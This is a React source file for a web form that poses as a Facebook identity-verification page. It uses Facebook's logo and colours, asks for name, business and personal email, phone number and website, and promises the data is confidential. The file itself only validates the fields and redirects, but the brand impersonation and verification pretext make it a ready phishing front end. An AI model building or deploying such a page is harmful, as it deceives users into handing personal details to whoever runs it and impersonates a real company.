import React, { useState } from 'react';
import { useLocation } from "wouter";
import { useForm } from "react-hook-form";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { CountryCodes } from "@/components/CountryCodes";
import { validateEmail, validatePhone, validateUrl } from "@/lib/utils";

interface FormData {
  firstName: string;
  lastName: string;
  businessEmail: string;
  personalEmail: string;
  phoneNumber: string;
  website: string;
}

export default function FormPage() {
  const [, setLocation] = useLocation();
  const [countryCode, setCountryCode] = useState("+91");
  const [errors, setErrors] = useState<Record<string, string>>({});
  
  const { register, handleSubmit, formState } = useForm<FormData>({
    defaultValues: {
      firstName: "",
      lastName: "",
      businessEmail: "",
      personalEmail: "",
      phoneNumber: "",
      website: ""
    }
  });

  const validateForm = (data: FormData) => {
    const newErrors: Record<string, string> = {};
    
    if (!data.firstName.trim()) {
      newErrors.firstName = "First name is required";
    }
    
    if (!data.lastName.trim()) {
      newErrors.lastName = "Last name is required";
    }
    
    if (!validateEmail(data.businessEmail)) {
      newErrors.businessEmail = "Please enter a valid business email";
    }
    
    if (!validateEmail(data.personalEmail)) {
      newErrors.personalEmail = "Please enter a valid personal email";
    }
    
    if (!validatePhone(data.phoneNumber)) {
      newErrors.phoneNumber = "Please enter a valid 10-digit phone number";
    }
    
    if (!validateUrl(data.website)) {
      newErrors.website = "Please enter a valid URL (e.g., https://example.com)";
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const onSubmit = (data: FormData) => {
    if (validateForm(data)) {
      setLocation("/success");
    }
  };

  return (
    <>
      <Card className="w-full max-w-md bg-white rounded-lg shadow-md">
        <CardContent className="p-6">
          <div className="flex justify-center mb-6">
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png" 
              alt="Facebook Logo" 
              className="h-12"
            />
          </div>
          
          <div className="text-center mb-6">
            <h1 className="text-xl font-bold text-[#1C1E21] mb-2">Verify Your Identity</h1>
            <p className="text-gray-600">Please provide the following information to verify your account.</p>
          </div>
          
          <form onSubmit={handleSubmit(onSubmit)}>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
              {/* First Name */}
              <div>
                <Label htmlFor="firstName" className="block text-sm font-medium text-gray-700 mb-1">
                  First Name
                </Label>
                <Input
                  id="firstName"
                  {...register("firstName")}
                  className="w-full p-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent"
                  placeholder="John"
                />
                {errors.firstName && (
                  <div className="text-red-500 text-xs mt-1">{errors.firstName}</div>
                )}
              </div>
              
              {/* Last Name */}
              <div>
                <Label htmlFor="lastName" className="block text-sm font-medium text-gray-700 mb-1">
                  Last Name
                </Label>
                <Input
                  id="lastName"
                  {...register("lastName")}
                  className="w-full p-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent"
                  placeholder="Doe"
                />
                {errors.lastName && (
                  <div className="text-red-500 text-xs mt-1">{errors.lastName}</div>
                )}
              </div>
            </div>
            
            {/* Business Email */}
            <div className="mb-4">
              <Label htmlFor="businessEmail" className="block text-sm font-medium text-gray-700 mb-1">
                Business Email
              </Label>
              <Input
                id="businessEmail"
                type="email"
                {...register("businessEmail")}
                className="w-full p-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent"
                placeholder="john.doe@company.com"
              />
              {errors.businessEmail && (
                <div className="text-red-500 text-xs mt-1">{errors.businessEmail}</div>
              )}
            </div>
            
            {/* Personal Email */}
            <div className="mb-4">
              <Label htmlFor="personalEmail" className="block text-sm font-medium text-gray-700 mb-1">
                Personal Email
              </Label>
              <Input
                id="personalEmail"
                type="email"
                {...register("personalEmail")}
                className="w-full p-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent"
                placeholder="john.doe@example.com"
              />
              {errors.personalEmail && (
                <div className="text-red-500 text-xs mt-1">{errors.personalEmail}</div>
              )}
            </div>
            
            {/* Phone Number */}
            <div className="mb-4">
              <Label htmlFor="phoneNumber" className="block text-sm font-medium text-gray-700 mb-1">
                Phone Number
              </Label>
              <div className="flex">
                <CountryCodes
                  value={countryCode}
                  onChange={setCountryCode}
                  className="rounded-l-md border border-gray-300 text-gray-700 focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent py-3 px-3 w-[100px]"
                />
                <Input
                  id="phoneNumber"
                  type="tel"
                  {...register("phoneNumber")}
                  className="w-full p-3 rounded-r-md border border-l-0 border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent"
                  placeholder="9876543210"
                />
              </div>
              {errors.phoneNumber && (
                <div className="text-red-500 text-xs mt-1">{errors.phoneNumber}</div>
              )}
            </div>
            
            {/* Website */}
            <div className="mb-6">
              <Label htmlFor="website" className="block text-sm font-medium text-gray-700 mb-1">
                Company/Personal Website
              </Label>
              <Input
                id="website"
                type="url"
                {...register("website")}
                className="w-full p-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1877F2] focus:border-transparent"
                placeholder="https://example.com"
              />
              {errors.website && (
                <div className="text-red-500 text-xs mt-1">{errors.website}</div>
              )}
            </div>
            
            <Button
              type="submit"
              disabled={formState.isSubmitting}
              className="w-full bg-[#1877F2] hover:bg-blue-600 text-white font-medium py-3 rounded-md transition-colors duration-200"
            >
              {formState.isSubmitting ? (
                <div className="flex items-center justify-center">
                  <div className="w-5 h-5 border-t-2 border-b-2 border-white rounded-full animate-spin mr-2"></div>
                  Submitting...
                </div>
              ) : (
                "Submit Verification"
              )}
            </Button>
          </form>
        </CardContent>
      </Card>

      <div className="w-full max-w-md text-center mt-4 text-gray-500 text-xs">
        <p>Your information is used only for verification purposes. All data is confidential.</p>
      </div>
    </>
  );
}
